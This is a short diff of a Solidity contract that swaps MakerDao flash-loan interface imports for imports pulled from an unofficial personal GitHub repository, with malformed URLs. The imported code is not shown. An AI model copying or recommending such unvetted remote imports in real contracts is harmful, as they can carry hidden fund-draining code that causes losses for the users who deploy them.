@@ -7,9 +7,11 @@
 
 pragma solidity ^0.6.12;
 
-//MakerDao Flashloan Contracts
-import"https://github.com/makerdao/dss-flash/blob/master/src/interface/IERC3156FlashBorrower.sol";
-import"https://github.com/makerdao/dss-flash/blob/master/src/interface/IERC3156FlashLender.sol";
+// Multiplier-Finance Smart Contracts
+import "https://github.com/yunfengflashloan/Multiplier-Finance/blob/main/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
+import "https://github.com/yunfengflashloan/Multiplier-Finance/blob/main/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
+
+
 
 //ViperSwap - VenomProtocol Contracts
 import"https://github.com/VenomProtocol/venomswap-contracts/blob/main/contracts/interfaces/IERC20.sol";
